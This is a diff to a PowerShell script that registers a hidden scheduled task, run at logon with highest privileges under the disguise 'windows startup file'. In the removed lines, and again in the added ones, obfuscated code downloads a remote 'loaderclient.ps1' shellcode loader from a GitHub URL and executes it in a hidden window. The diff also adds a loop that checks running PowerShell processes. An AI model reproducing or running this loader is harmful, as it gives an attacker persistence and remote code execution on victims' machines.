@@ -5,9 +5,15 @@ while ($true) {
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
+    $processes = wmic process get CommandLine,Name | Select-String "powershell"
 
-    $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
-    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-    Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+    foreach ($proc in $processes) {
+        if ($proc -match "shellcode" -or $proc -match "loaderclient.ps1") {
+            $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+            $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+        }
+    }
+    
     Start-Sleep -Seconds 3 # Tạm dừng 1 giây để tránh quá tải
 }
